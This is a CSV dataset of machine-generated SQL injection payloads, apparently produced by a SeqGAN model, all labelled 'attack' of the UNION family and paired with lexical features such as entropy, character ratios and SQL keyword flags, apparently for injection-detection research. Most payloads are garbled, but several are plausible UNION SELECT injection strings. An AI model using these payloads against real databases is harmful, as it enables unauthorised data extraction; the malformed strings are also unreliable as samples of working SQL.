label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-3879'  )     )     )     )     )  )    ""+  )     )    )   union all all all all all select 7348,9921,4854,5756,4909 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254,119.0,27.0,3.4241058871377352,26.0,24.0,50.0,19.0,0.2184873949579832,0.20168067226890757,0.42016806722689076,0.15966386554621848,1.0,1.0,3.0,0.0,0.0,0.0,0.0,9.0,0.0,0.0,4.0,4.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-3378'  )    union all select ,4266,3339,7348,9814,3084,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255,61.0,25.0,4.1800162306863085,14.0,28.0,9.0,10.0,0.22950819672131148,0.45901639344262296,0.14754098360655737,0.16393442622950818,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-5131""  )    )    )   union all select null where@VEERSION where ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256,65.0,28.0,4.032524532435858,36.0,4.0,19.0,6.0,0.5538461538461539,0.06153846153846154,0.2923076923076923,0.09230769230769231,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'  s'  )    )    9517  )    union all all * @1494,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257,50.0,17.0,3.131510777487775,12.0,9.0,22.0,7.0,0.24,0.18,0.44,0.14,2.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-6097'  )    )   union all 1  )     )    union all all select null,null,5756,8123,8123,8123,5756,----9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258,106.0,25.0,4.037589832890904,33.0,29.0,26.0,18.0,0.3113207547169811,0.27358490566037735,0.24528301886792453,0.16981132075471697,1.0,0.0,5.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,7.0,5.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,-5945'  )    )    )    )  )   union all  . @1@id  )$  )   union all select from null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259,86.0,25.0,3.508754336162462,32.0,5.0,34.0,15.0,0.37209302325581395,0.05813953488372093,0.3953488372093023,0.1744186046511628,1.0,0.0,3.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-2190''  )    ) union    O union all 1494,9814rs users id  =  o select from users where id  =  =  '1'  =  )    union all 2285,@@VERSION -- -- @VERSION   (  1,  )   )     )  )    union all all all all all 1@+ us  8521 id    1 union all select 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260,243.0,39.0,4.110050760147873,106.0,25.0,83.0,29.0,0.43621399176954734,0.102880658436214,0.34156378600823045,0.11934156378600823,4.0,0.0,5.0,0.0,0.0,4.0,0.0,8.0,0.0,0.0,3.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-8521' union select 4481,3339,7497,6996,4854,e5945#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261,51.0,23.0,4.2263742446802315,12.0,28.0,3.0,8.0,0.23529411764705882,0.5490196078431373,0.058823529411764705,0.1568627450980392,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"18986' union all select null,4600 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262,36.0,20.0,4.059531433357948,18.0,9.0,5.0,4.0,0.5,0.25,0.1388888888888889,0.1111111111111111,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-)   --e""  )   )     )     )    )    )    )    )    )  )     )    union all iselect 8665,6996,3990,12496294'@,l)INO usi,vsrs where id$  =  =  =  =  )    union all all select 9921,7845,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263,189.0,38.0,3.8618707201269977,51.0,32.0,73.0,33.0,0.2698412698412698,0.1693121693121693,0.3862433862433862,0.1746031746031746,1.0,1.0,3.0,0.0,0.0,4.0,0.0,14.0,0.0,0.0,7.0,7.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'  )     )    )    )    union union all all all all ,3059,7348,5756,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264,74.0,20.0,3.566126612268206,22.0,17.0,25.0,10.0,0.2972972972972973,0.22972972972972974,0.33783783783783783,0.13513513513513514,1.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack," all select ,@9357,1249,1249',4266,9357,8986,6996,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265,55.0,21.0,4.033378522844339,9.0,32.0,3.0,11.0,0.16363636363636364,0.5818181818181818,0.05454545454545454,0.2,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-""  )   union all all select 3480,3480,3990,7845,3990,7348,48547348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266,68.0,23.0,4.10107074629497,17.0,32.0,9.0,10.0,0.25,0.47058823529411764,0.1323529411764706,0.14705882352941177,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-)  1401  )     )    a   )   )  )  )     union union select @s@$,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267,64.0,18.0,2.949506717556307,18.0,4.0,31.0,11.0,0.28125,0.0625,0.484375,0.171875,0.0,0.0,1.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,-8073  )   union all select * from@N @,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268,38.0,23.0,4.038080975258398,19.0,4.0,10.0,5.0,0.5,0.10526315789473684,0.2631578947368421,0.13157894736842105,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-2190'  )   union all select ,null,4600,7348 93229322#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269,54.0,25.0,4.245201511928806,18.0,20.0,9.0,7.0,0.3333333333333333,0.37037037037037035,0.16666666666666666,0.12962962962962962,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-8812%""    )    union all  all union from null,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270,49.0,19.0,3.616094346321389,24.0,4.0,14.0,7.0,0.4897959183673469,0.08163265306122448,0.2857142857142857,0.14285714285714285,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'  )  )    unionall select null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271,43.0,16.0,3.39467762827672,26.0,1.0,10.0,6.0,0.6046511627906976,0.023255813953488372,0.23255813953488372,0.13953488372093023,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-'  )     )   )    )     )  )     )     )    union select null,null,9814--,7348,8665,3072,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272,95.0,25.0,3.5499741344815923,19.0,20.0,37.0,19.0,0.2,0.21052631578947367,0.3894736842105263,0.2,1.0,0.0,3.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6""  )     )     )  2088 union select null,4266,7497,4300,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273,63.0,23.0,3.9317093475235683,19.0,17.0,17.0,10.0,0.30158730158730157,0.2698412698412698,0.2698412698412698,0.15873015873015872,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,",-6667'  )   unione   =1  )    union all select 8268,1646,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274,64.0,23.0,3.956701862243749,20.0,17.0,17.0,10.0,0.3125,0.265625,0.265625,0.15625,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-5575""  )    union all *  *<seers i'1'  (  I     =  select 9517,@i1  )    )    )    )    )   union 4266,9921,9921,7348,3072,7348,3990r,@@vers4600  )     as users id  =  all all all all all all from ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275,198.0,37.0,4.124409109701251,63.0,42.0,65.0,28.0,0.3181818181818182,0.21212121212121213,0.3282828282828283,0.1414141414141414,2.0,1.0,1.0,0.0,2.0,2.0,0.0,8.0,0.0,0.0,8.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-)    S union all select from,9814,3072',3339,vers --,vers where il=  =  '1' union select 8665,,9110,8665,8123,5756,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276,121.0,34.0,4.625555846564537,45.0,37.0,18.0,21.0,0.371900826446281,0.30578512396694213,0.1487603305785124,0.17355371900826447,3.0,0.0,3.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,11.0,5.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-8812""  where 8890$ union all all select null,7497,9322,2446,7348,8123,8986,8123,9814,1441,3084,9814,7348,4300,8123,8123,null,8123,9988,5756,3072,9814,8123,1297,9814,8123,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277,176.0,29.0,4.0712555699692015,30.0,108.0,8.0,30.0,0.17045454545454544,0.6136363636363636,0.045454545454545456,0.17045454545454544,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-7531 =    =  \union$  ioselect null,4266,4266,4600#,4854,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278,64.0,25.0,4.2630059710789405,21.0,20.0,10.0,13.0,0.328125,0.3125,0.15625,0.203125,0.0,0.0,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,5.0,5.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-1401""""  )    )    union all all all all * 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279,44.0,14.0,3.0331841754063094,17.0,5.0,16.0,6.0,0.38636363636363635,0.11363636363636363,0.36363636363636365,0.13636363636363635,0.0,2.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-5131%""    )    )    )    8073  )    )   8890  =  =  1 4338 union select $@Vs@VEEVE3596er  )    )    )     )  wherea)    )    )     )    )    if=  =  )    as  union all all all all all 1,)N useh id  =  )    union all select 2446,5756,2446,8986,8986,7348,#,7348,5756,8665,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280,277.0,38.0,3.954433352706546,71.0,62.0,102.0,42.0,0.2563176895306859,0.22382671480144403,0.36823104693140796,0.15162454873646208,0.0,1.0,3.0,0.0,0.0,5.0,0.0,17.0,1.0,0.0,11.0,8.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-6075'   )  )     )     )    )   union all select #,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281,51.0,19.0,2.996720778815252,14.0,4.0,25.0,8.0,0.27450980392156865,0.0784313725490196,0.49019607843137253,0.1568627450980392,1.0,0.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack," all select us @E&&i,1646--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282,27.0,17.0,3.9121138909722286,13.0,4.0,4.0,6.0,0.48148148148148145,0.14814814814814814,0.14814814814814814,0.2222222222222222,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-4542 union all all select 1297,2263,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283,43.0,22.0,4.200007639511387,17.0,16.0,5.0,5.0,0.3953488372093023,0.37209302325581395,0.11627906976744186,0.11627906976744186,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,13370' )   )    )     )    )    union  =  8268  2285 1646  N select )    5349s where  =  ( union all all 1--8772   N @,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284,118.0,31.0,3.7194248472511395,30.0,26.0,49.0,13.0,0.2542372881355932,0.22033898305084745,0.4152542372881356,0.11016949152542373,1.0,0.0,2.0,0.0,0.0,2.0,0.0,7.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-s union select null,1249,1249,1249,4909,6996,1249,4909",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285,55.0,18.0,3.8059923878138564,16.0,28.0,3.0,8.0,0.2909090909090909,0.509090909090909,0.05454545454545454,0.14545454545454545,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-5945"" -- union all all --,7845,8986,'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286,38.0,17.0,3.8404553172497953,11.0,12.0,5.0,10.0,0.2894736842105263,0.3157894736842105,0.13157894736842105,0.2631578947368421,1.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,5.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"t where  f-)  =  =  =  1 7815  1 union all all all select null,null,8123,4909,3990,9988,4854,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287,103.0,29.0,4.2371533461678945,35.0,34.0,20.0,14.0,0.33980582524271846,0.3300970873786408,0.1941747572815534,0.13592233009708737,0.0,0.0,1.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,8.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"all all select 8123,4266,4300,5756,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288,41.0,18.0,4.025132724542701,12.0,20.0,3.0,6.0,0.2926829268292683,0.4878048780487805,0.07317073170731707,0.14634146341463414,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
